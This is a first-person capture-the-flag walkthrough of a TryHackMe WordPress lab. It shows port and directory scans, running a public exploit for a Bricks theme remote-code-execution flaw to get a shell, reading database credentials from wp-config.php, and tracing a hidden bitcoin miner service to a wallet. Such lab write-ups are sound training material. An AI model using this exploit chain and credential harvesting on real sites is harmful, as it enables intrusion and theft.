![Screenshot 2024-09-15 214332](https://github.com/user-attachments/assets/37d39fec-2429-4e1e-ab27-dbfec528246b)Adding the IP address into the /etc/hosts file.

Then, starting with machine enumeration:

```
┌──(kali㉿kali)-[~/Desktop/THM/BrickHeist]
└─$ sudo nmap -sS 10.10.237.113 > open_ports.thm 
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/BrickHeist]
└─$ cat open_ports.thm 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 20:06 IST
Nmap scan report for bricks.thm (10.10.237.113)
Host is up (0.24s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3306/tcp open  mysql

Nmap done: 1 IP address (1 host up) scanned in 3.09 seconds
```

```
┌──(kali㉿kali)-[~/Desktop/THM/BrickHeist]
└─$ sudo nmap -sS -sV -sC -O -Pn -p22,80,443,3306 10.10.237.113 > ports_scan.txt
                                                                                                                                                 
┌──(kali㉿kali)-[~/Desktop/THM/BrickHeist]
└─$ cat ports_scan.txt 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-29 20:07 IST
Nmap scan report for bricks.thm (10.10.237.113)
Host is up (0.22s latency).

PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 64:fb:40:f1:8d:4d:d8:b8:70:f2:e6:e9:1d:82:33:5f (RSA)
|   256 f4:6f:49:f9:09:29:34:4b:13:02:1d:d5:01:fc:70:df (ECDSA)
|_  256 7c:c1:97:8c:cb:fc:3e:36:d9:0b:ed:a2:c4:e1:62:ca (ED25519)
80/tcp   open  http      WebSockify Python/3.8.10
|_http-title: Error response
|_http-server-header: WebSockify Python/3.8.10
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: WebSockify Python/3.8.10
|     Date: Thu, 29 Aug 2024 14:37:58 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 472
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 405</p>
|     <p>Message: Method Not Allowed.</p>
|     <p>Error code explanation: 405 - Specified method is invalid for this resource.</p>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 501 Unsupported method ('OPTIONS')
|     Server: WebSockify Python/3.8.10
|     Date: Thu, 29 Aug 2024 14:38:00 GMT
|     Connection: close
|     Content-Type: text/html;charset=utf-8
|     Content-Length: 500
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"
|     "http://www.w3.org/TR/html4/strict.dtd">
|     <html>
|     <head>
|     <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 501</p>
|     <p>Message: Unsupported method ('OPTIONS').</p>
|     <p>Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.</p>
|     </body>
|_    </html>
443/tcp  open  ssl/https Apache
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: 400 Bad Request
| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=US
| Not valid before: 2024-04-02T11:59:14
|_Not valid after:  2025-04-02T11:59:14
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache
3306/tcp open  mysql     MySQL (unauthorized)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=8/29%Time=66D087C4%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,291,"HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\
SF:x20WebSockify\x20Python/3\.8\.10\r\nDate:\x20Thu,\x2029\x20Aug\x202024\
SF:x2014:37:58\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x20text/htm
SF:l;charset=utf-8\r\nContent-Length:\x20472\r\n\r\n<!DOCTYPE\x20HTML\x20P
SF:UBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x20\x20\x20
SF:\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\n\x20\x20
SF:\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-equiv=\"C
SF:ontent-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x20\x20\x20
SF:\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</hea
SF:d>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x
SF:20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x204
SF:05</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Method\x20Not\x2
SF:0Allowed\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20exp
SF:lanation:\x20405\x20-\x20Specified\x20method\x20is\x20invalid\x20for\x2
SF:0this\x20resource\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(HTTPOpt
SF:ions,2B9,"HTTP/1\.1\x20501\x20Unsupported\x20method\x20\('OPTIONS'\)\r\
SF:nServer:\x20WebSockify\x20Python/3\.8\.10\r\nDate:\x20Thu,\x2029\x20Aug
SF:\x202024\x2014:38:00\x20GMT\r\nConnection:\x20close\r\nContent-Type:\x2
SF:0text/html;charset=utf-8\r\nContent-Length:\x20500\r\n\r\n<!DOCTYPE\x20
SF:HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x204\.01//EN\"\n\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\"http://www\.w3\.org/TR/html4/strict\.dtd\">\n<html>\
SF:n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20http-
SF:equiv=\"Content-Type\"\x20content=\"text/html;charset=utf-8\">\n\x20\x2
SF:0\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\x20
SF:\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h
SF:1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20c
SF:ode:\x20501</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Unsuppo
SF:rted\x20method\x20\('OPTIONS'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:<p>Error\x20code\x20explanation:\x20HTTPStatus\.NOT_IMPLEMENTED\x20-\x2
SF:0Server\x20does\x20not\x20support\x20this\x20operation\.</p>\n\x20\x20\
SF:x20\x20</body>\n</html>\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.5 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 5 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 137.05 seconds

```

SSH, HTTP, HTTPS and MySQL are running on the machine.

Accessing the HTTP site returns error 405, Method Not Allowed.

I then accessed the HTTPS site, and even though it is HTTPS, Firefox prompts that the site can be dangerous, maybe because the SSL certificate expired or the Untrusted Certificate Authority. Whatever it, we accept the Risk and Continue.

A normal site showing a wall made by bricks. Analogous to the name of the room. Anyway I tried to fuzz the website for sub-directories

```
┌──(kali㉿kali)-[~/Desktop/THM/BrickHeist]
└─$ gobuster dir -u https://bricks.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     https://bricks.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/rss                  (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
/login                (Status: 302) [Size: 0] [--> https://bricks.thm/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> https://bricks.thm/0/]
/feed                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
/atom                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/atom/]
/s                    (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
/b                    (Status: 301) [Size: 0] [--> https://bricks.thm/2024/04/02/brick-by-brick/]
/wp-content           (Status: 301) [Size: 238] [--> https://bricks.thm/wp-content/]
/admin                (Status: 302) [Size: 0] [--> https://bricks.thm/wp-admin/]
/rss2                 (Status: 301) [Size: 0] [--> https://bricks.thm/feed/]
/wp-includes          (Status: 301) [Size: 239] [--> https://bricks.thm/wp-includes/]
/br                   (Status: 301) [Size: 0] [--> https://bricks.thm/2024/04/02/brick-by-brick/]
/S                    (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
/B                    (Status: 301) [Size: 0] [--> https://bricks.thm/2024/04/02/brick-by-brick/]
/sa                   (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
/rdf                  (Status: 301) [Size: 0] [--> https://bricks.thm/feed/rdf/]
/page1                (Status: 301) [Size: 0] [--> https://bricks.thm/]
/sample               (Status: 301) [Size: 0] [--> https://bricks.thm/sample-page/]
/'                    (Status: 301) [Size: 0] [--> https://bricks.thm/]
Progress: 2627 / 220561 (1.19%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 2629 / 220561 (1.19%)
```

Two things to note here: the `-k` flag to skip SSL certificate verification, and I stopped the search midway because it was showing too many redirections or size: 0.

However, I got to know that the website is using WordPress. So now time to run the `wpscan`.

```
┌──(kali㉿kali)-[~/Desktop/THM/BrickHeist]
└─$ wpscan --url https://bricks.thm --disable-tls-checks
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.27
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: https://bricks.thm/ [10.10.166.198]
[+] Started: Sun Sep 15 20:01:55 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: server: Apache
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] robots.txt found: https://bricks.thm/robots.txt
 | Interesting Entries:
 |  - /wp-admin/
 |  - /wp-admin/admin-ajax.php
 | Found By: Robots Txt (Aggressive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: https://bricks.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: https://bricks.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: https://bricks.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.5 identified (Insecure, released on 2024-04-02).
 | Found By: Rss Generator (Passive Detection)
 |  - https://bricks.thm/feed/, <generator>https://wordpress.org/?v=6.5</generator>
 |  - https://bricks.thm/comments/feed/, <generator>https://wordpress.org/?v=6.5</generator>

[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:19 <==================================================================> (137 / 137) 100.00% Time: 00:00:19

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Sep 15 20:02:46 2024
[+] Requests Done: 170
[+] Cached Requests: 7
[+] Data Sent: 41.448 KB
[+] Data Received: 110.502 KB
[+] Memory used: 279.953 MB
[+] Elapsed time: 00:00:50
```

`--disable-tls-checks` is required to skip the TLS check; otherwise, it will not run.

```
[+] WordPress theme in use: bricks
 | Location: https://bricks.thm/wp-content/themes/bricks/
 | Readme: https://bricks.thm/wp-content/themes/bricks/readme.txt
 | Style URL: https://bricks.thm/wp-content/themes/bricks/style.css
 | Style Name: Bricks
 | Style URI: https://bricksbuilder.io/
 | Description: Visual website builder for WordPress....
 | Author: Bricks
 | Author URI: https://bricksbuilder.io/
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.9.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - https://bricks.thm/wp-content/themes/bricks/style.css, Match: 'Version: 1.9.5'
```

Worpress theme with version 1.9.5

A simple Google search for the exploit for WordPress 1.9.5 gives CVE-2024-25600 an RCE. I downloaded it on my machine and ran it.

```
┌──(kali㉿kali)-[~/Desktop/THM/BrickHeist]
└─$ python3 CVE-2024-25600.py -u https://bricks.thm

   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \
 / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
    
Coded By: K3ysTr0K3R --> Hello, Friend!

[*] Checking if the target is vulnerable
[+] The target is vulnerable
[*] Initiating exploit against: https://bricks.thm
[*] Initiating interactive shell
[+] Interactive shell opened successfully
Shell> whoami
apache

Shell> 
```

Got the shell.

```
Shell> ls
650c844110baced87e1606453b93f22a.txt
index.php
kod
license.txt
phpmyadmin
readme.html
wp-activate.php
wp-admin
wp-blog-header.php
wp-comments-post.php
wp-config-sample.php
wp-config.php
wp-content
wp-cron.php
wp-includes
wp-links-opml.php
wp-load.php
wp-login.php
wp-mail.php
wp-settings.php
wp-signup.php
wp-trackback.php
xmlrpc.php
```

A good practice that I have learned is to check the config files. I checked the `wp-config.php`.

```
Shell> cat wp-config.php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'root' );

/** Database password */
define( 'DB_PASSWORD', 'lamp.sh' );
...
```

The credentials for phpmyadmin: root:lamp.sh

<img src=https://github.com/user-attachments/assets/4ccb3253-bb91-48d6-836a-a78327374586>

Admin panel for WordPress, MySQL, phpmyadmin, etc, but nothing much.

I looked at the questions given. It asked for services running. The command I know is `ps`, which doesn't give the answer. I Google searched for services command and what to use was systemctl.

```
Shell> systemctl --state=running
  UNIT                                           LOAD   ACTIVE SUB     DESCRIPTION
...

ubuntu.service                                   loaded active     running   TRYHACK3M 
```

```
Shell> systemctl cat ubuntu.service
# /etc/systemd/system/ubuntu.service
[Unit]
Description=TRYHACK3M

[Service]
Type=simple
ExecStart=/lib/NetworkManager/nm-inet-dialog
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

```
apache@tryhackme:/data/www/default$ cd /lib/NetworkManager
cd /lib/NetworkManager
apache@tryhackme:/lib/NetworkManager$ ls
VPN
conf.d
dispatcher.d
inet.conf
nm-dhcp-helper
nm-dispatcher
nm-iface-helper
nm-inet-dialog
nm-initrd-generator
nm-openvpn-auth-dialog
nm-openvpn-service
nm-openvpn-service-openvpn-helper
nm-pptp-auth-dialog
nm-pptp-service
system-connections
apache@tryhackme:/lib/NetworkManager$
```

I then used bash to get a reverse shell, as with the CVE shell I was not able to change to other directories.

The inet.conf is the log file for the miner instance.

```
apache@tryhackme:/lib/NetworkManager$ cat inet.conf
cat inet.conf
ID: 5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
2024-04-08 10:46:04,743 [*] confbak: Ready!
2024-04-08 10:46:04,743 [*] Status: Mining!
2024-04-08 10:46:08,745 [*] Miner()
2024-04-08 10:46:08,745 [*] Bitcoin Miner Thread Started
2024-04-08 10:46:08,745 [*] Status: Mining!
2024-04-08 10:46:10,747 [*] Miner()
2024-04-08 10:46:12,748 [*] Miner()
```

I used CyberChef with the magic operation and I got an address:

<img src=https://github.com/user-attachments/assets/3f482278-47ed-4e0e-9eec-b09b2aec0b63>

I tried to submit the address, but it was the wrong answer.

Then I searched for the bitcoin wallet address and it is around 25-35 charactes long. But what we have is 85 characters long. After analysing the address, I noticed that there is repeatation.

The address is: `bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qa`

Then the next task is to use the web to gather information about the wallet. 

<img src=https://github.com/user-attachments/assets/0af925f4-fa01-475e-ae27-59995f36a14e>

<img src=https://github.com/user-attachments/assets/eab702f3-37f1-43f7-ad98-65aa3daa17fd>

I don't know much about bitcoin and stuffs, but what I feel, the first address that we got using CyberChef is the final address where the bitcoin was stored. 

The second address (from the second image) is related to the LockBit Ransomware Group:

<img src=https://github.com/user-attachments/assets/58932f24-6581-4317-b999-f65e7cbb9332>
